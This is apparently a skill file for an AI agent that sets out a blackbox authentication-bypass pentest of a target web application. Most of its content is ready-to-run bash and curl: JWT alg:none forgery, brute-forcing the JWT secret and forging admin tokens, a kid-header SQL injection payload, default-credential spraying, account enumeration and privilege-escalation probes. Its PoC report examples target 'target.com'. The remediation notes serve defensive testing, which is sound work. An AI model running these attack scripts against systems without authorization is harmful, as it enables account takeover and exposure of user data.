---
name: blackbox-auth
description: >-
  Actively test a target web application for authentication bypass and broken
  access control vulnerabilities using blackbox techniques. Reads
  pentest/target-map.md, tests for missing authentication on sensitive
  endpoints, JWT forgery (alg:none, weak secret brute-force), session fixation,
  default credentials, password policy bypass, account enumeration via response
  differences, and vertical privilege escalation. Writes confirmed findings with
  PoC curl commands to pentest/auth-bypass-results.md. Use when asked to find
  auth bypass or broken access control in a blackbox pentest.
---

# Blackbox Authentication Bypass & Broken Access Control

You are actively testing a web application for authentication and authorization vulnerabilities without source code access. You will test for missing auth, weak tokens, JWT issues, and privilege escalation.

**Prerequisite**: Read `pentest/target-map.md` before starting.

---

## Phase 1: Missing Authentication on Sensitive Endpoints

From `pentest/target-map.md`, take every endpoint marked "Auth required" or "Admin" and test it without a token:

```bash
# Test without any Authorization header
curl -sk -D - "<TARGET_URL>/api/admin/users"
curl -sk -D - "<TARGET_URL>/api/admin/settings"
curl -sk -D - "<TARGET_URL>/api/users"
curl -sk -D - "<TARGET_URL>/dashboard"

# Test with empty token
curl -sk -D - "<TARGET_URL>/api/users" \
  -H "Authorization: Bearer "

# Test with invalid token
curl -sk -D - "<TARGET_URL>/api/users" \
  -H "Authorization: Bearer invalid.token.here"
```

**Confirmed missing auth** if any sensitive endpoint returns HTTP 200 without a valid token.

---

## Phase 2: JWT Vulnerability Testing

If the application uses JWT tokens:

### Step 1: Capture a JWT

Login and capture your token:
```bash
RESPONSE=$(curl -sk -X POST "<TARGET_URL>/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"testuser","password":"testpass"}')
TOKEN=$(echo $RESPONSE | grep -o '"token":"[^"]*"' | cut -d'"' -f4)
echo "Token: $TOKEN"
```

Decode the token (split by `.` and base64-decode each part):
```bash
echo $TOKEN | cut -d'.' -f1 | base64 -d 2>/dev/null
echo $TOKEN | cut -d'.' -f2 | base64 -d 2>/dev/null
```

Note: algorithm in header (`HS256`, `RS256`, `none`), claims in payload (`sub`, `role`, `exp`).

### Step 2: Algorithm None Attack

```bash
# Craft header: {"alg":"none","typ":"JWT"} → base64url
HEADER='{"alg":"none","typ":"JWT"}'
HEADER_B64=$(echo -n "$HEADER" | base64 | tr '+/' '-_' | tr -d '=')

# Original payload — modify role if present
PAYLOAD=$(echo $TOKEN | cut -d'.' -f2 | base64 -d 2>/dev/null)
# Modify role: change "user" to "admin"
MODIFIED_PAYLOAD=$(echo $PAYLOAD | sed 's/"role":"user"/"role":"admin"/')
PAYLOAD_B64=$(echo -n "$MODIFIED_PAYLOAD" | base64 | tr '+/' '-_' | tr -d '=')

# Empty signature
NONE_TOKEN="${HEADER_B64}.${PAYLOAD_B64}."

curl -sk "<TARGET_URL>/api/admin/users" \
  -H "Authorization: Bearer $NONE_TOKEN"
```

**Confirmed alg:none** if the request succeeds with a 200 response.

### Step 3: Weak Secret Brute Force

Try common JWT secrets:
```bash
# Save the token
echo $TOKEN > /tmp/jwt_token.txt

# Test common secrets manually using jq + openssl
for SECRET in secret password changeme admin jwt-secret secretkey 12345678 default; do
  # Recompute HMAC-SHA256 signature
  HEADER_PAYLOAD="$(echo $TOKEN | cut -d'.' -f1).$(echo $TOKEN | cut -d'.' -f2)"
  EXPECTED_SIG=$(echo -n "$HEADER_PAYLOAD" | openssl dgst -sha256 -hmac "$SECRET" -binary | base64 | tr '+/' '-_' | tr -d '=')
  ACTUAL_SIG=$(echo $TOKEN | cut -d'.' -f3)
  if [ "$EXPECTED_SIG" = "$ACTUAL_SIG" ]; then
    echo "[FOUND] JWT secret: $SECRET"
    break
  fi
done
```

If secret found, forge any role:
```bash
HEADER='{"alg":"HS256","typ":"JWT"}'
PAYLOAD='{"sub":"1","role":"admin","exp":9999999999}'
HEADER_B64=$(echo -n "$HEADER" | base64 | tr '+/' '-_' | tr -d '=')
PAYLOAD_B64=$(echo -n "$PAYLOAD" | base64 | tr '+/' '-_' | tr -d '=')
SIG=$(echo -n "${HEADER_B64}.${PAYLOAD_B64}" | openssl dgst -sha256 -hmac "secret" -binary | base64 | tr '+/' '-_' | tr -d '=')
FORGED_TOKEN="${HEADER_B64}.${PAYLOAD_B64}.${SIG}"

curl -sk "<TARGET_URL>/api/admin/users" \
  -H "Authorization: Bearer $FORGED_TOKEN"
```

### Step 4: JWT kid Header Injection

If the JWT contains a `kid` field in the header:
```bash
# Check for kid
echo $TOKEN | cut -d'.' -f1 | base64 -d 2>/dev/null

# If kid is present, test SQL injection via kid
# The server may use: SELECT key FROM jwt_keys WHERE id = '<kid>'

# kid SQLi — sign with empty string as key
HEADER='{"alg":"HS256","typ":"JWT","kid":"nothing\" UNION SELECT \"\";"}'
HEADER_B64=$(echo -n "$HEADER" | base64 | tr '+/' '-_' | tr -d '=')
PAYLOAD_B64=$(echo $TOKEN | cut -d'.' -f2)
SIG=$(echo -n "${HEADER_B64}.${PAYLOAD_B64}" | openssl dgst -sha256 -hmac "" -binary | base64 | tr '+/' '-_' | tr -d '=')
KID_TOKEN="${HEADER_B64}.${PAYLOAD_B64}.${SIG}"

curl -sk "<TARGET_URL>/api/me" \
  -H "Authorization: Bearer $KID_TOKEN"
```

---

## Phase 3: Default Credentials Testing

Test the login endpoint with common default credentials:

```bash
for CREDS in "admin:admin" "admin:password" "admin:admin123" "admin:1234" \
             "admin:changeme" "root:root" "root:password" "test:test" \
             "administrator:administrator" "admin:letmein"; do
  USER=$(echo $CREDS | cut -d':' -f1)
  PASS=$(echo $CREDS | cut -d':' -f2)
  STATUS=$(curl -sk -o /dev/null -w "%{http_code}" \
    -X POST "<TARGET_URL>/api/login" \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"$USER\",\"password\":\"$PASS\"}")
  echo "$CREDS → HTTP $STATUS"
done
```

**Confirmed** if any return HTTP 200 (successful login).

---

## Phase 4: Account Enumeration

Test if the application reveals whether a username exists:

```bash
# Valid username, wrong password
curl -sk -X POST "<TARGET_URL>/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"wrongpassword123"}' \
  -D -

# Non-existent username, any password
curl -sk -X POST "<TARGET_URL>/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"nonexistentuser12345","password":"wrongpassword123"}' \
  -D -
```

Compare:
- If response bodies differ (e.g. "Invalid password" vs "User not found") → **account enumeration possible**
- If response times differ significantly → **timing-based enumeration possible**
- If HTTP status differs → **enumeration via status code**

---

## Phase 5: Password Policy & Reset Logic

### Weak Password Policy
```bash
# Test if weak passwords are accepted
curl -sk -X POST "<TARGET_URL>/api/register" \
  -H "Content-Type: application/json" \
  -d '{"username":"weakpasstest","email":"weak@test.com","password":"1"}'
```

### Password Reset Token Testing
```bash
# Request password reset
curl -sk -X POST "<TARGET_URL>/api/password/reset" \
  -H "Content-Type: application/json" \
  -d '{"email":"testuser@test.com"}'

# Check if token is short/sequential (would need to test via email)
# Test if reset token can be used multiple times
# Test if reset token doesn't expire
```

---

## Phase 6: Vertical Privilege Escalation

Test if a regular user can access admin-only endpoints:

```bash
# Login as regular user
TOKEN=$(curl -sk -X POST "<TARGET_URL>/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"regularuser","password":"pass"}' | \
  grep -o '"token":"[^"]*"' | cut -d'"' -f4)

# Try admin endpoints
for ENDPOINT in "/api/admin/users" "/api/admin/settings" "/api/users" \
                "/admin" "/api/stats" "/api/logs" "/api/admin"; do
  STATUS=$(curl -sk -o /dev/null -w "%{http_code}" \
    "<TARGET_URL>$ENDPOINT" \
    -H "Authorization: Bearer $TOKEN")
  echo "$ENDPOINT → HTTP $STATUS"
done
```

**Confirmed vertical escalation** if any admin endpoints return 200 with a regular user token.

---

## Phase 7: Session Security Testing

```bash
# Check session cookie flags
curl -sk -D - -X POST "<TARGET_URL>/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"test","password":"test"}'

# Look for in Set-Cookie header:
# HttpOnly — missing = XSS can steal cookie
# Secure — missing = cookie sent over HTTP
# SameSite — missing = CSRF possible
```

---

## Output Format

Write findings to `pentest/auth-bypass-results.md`:

```markdown
# Auth Bypass / Access Control Assessment Results

## Executive Summary
- Auth checks tested: [N]
- Confirmed Auth Bypass: [N]
- JWT Vulnerabilities: [N]
- Privilege Escalation: [N]
- Default Creds Found: [N]

## Findings

### [CONFIRMED] JWT alg:none accepted — Authentication Bypass

- **Endpoint**: Any authenticated endpoint
- **Vulnerability**: Server accepts JWT with `"alg":"none"` — signature not verified
- **Impact**: Authentication bypass — attacker can forge any identity, elevate to admin
- **PoC**:
  ```bash
  # Forge admin JWT with alg:none (no signature needed)
  HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr '+/' '-_' | tr -d '=')
  PAYLOAD=$(echo -n '{"sub":"1","role":"admin","exp":9999999999}' | base64 | tr '+/' '-_' | tr -d '=')
  TOKEN="${HEADER}.${PAYLOAD}."

  curl -sk "https://target.com/api/admin/users" \
    -H "Authorization: Bearer $TOKEN"
  # Expected: 200 with full user list — privileges escalated to admin
  ```
- **Remediation**: Explicitly specify allowed algorithms in JWT verification. Reject tokens with `alg:none`. Use `jwt.verify(token, secret, { algorithms: ['HS256'] })`.

### [CONFIRMED] Default credentials admin:admin accepted

- **Endpoint**: `POST /api/login`
- **Credentials**: `admin` / `admin`
- **Impact**: Full administrator account access
- **PoC**:
  ```bash
  curl -sk -X POST "https://target.com/api/login" \
    -H "Content-Type: application/json" \
    -d '{"username":"admin","password":"admin"}'
  # Expected: HTTP 200 with admin JWT token
  ```
- **Remediation**: Change default credentials immediately. Enforce strong password policy. Implement account lockout after N failed attempts.

### [CONFIRMED] Missing auth on /api/users

- **Endpoint**: `GET /api/users`
- **Impact**: Unauthenticated access to full user list including emails, roles, and IDs
- **PoC**:
  ```bash
  curl -sk "https://target.com/api/users"
  # Expected: HTTP 200 with list of all user objects — no auth required
  ```
- **Remediation**: Apply authentication middleware to all non-public endpoints. Verify every endpoint requires a valid session/token.
```

After writing results, delete `pentest/auth-recon.md` if it was created.

---

## Important Reminders

- Test JWT vulnerabilities before other auth vectors — they're high impact and common.
- Account enumeration via response differences is a Medium severity finding — document it even if not directly exploitable.
- Always test both GET and POST/DELETE/PUT methods on admin endpoints — they may have different access controls.
- Missing HttpOnly on session cookie is Medium (enables XSS cookie theft). Missing Secure flag is Low.
- Clean up test accounts created during testing if there's a delete endpoint.
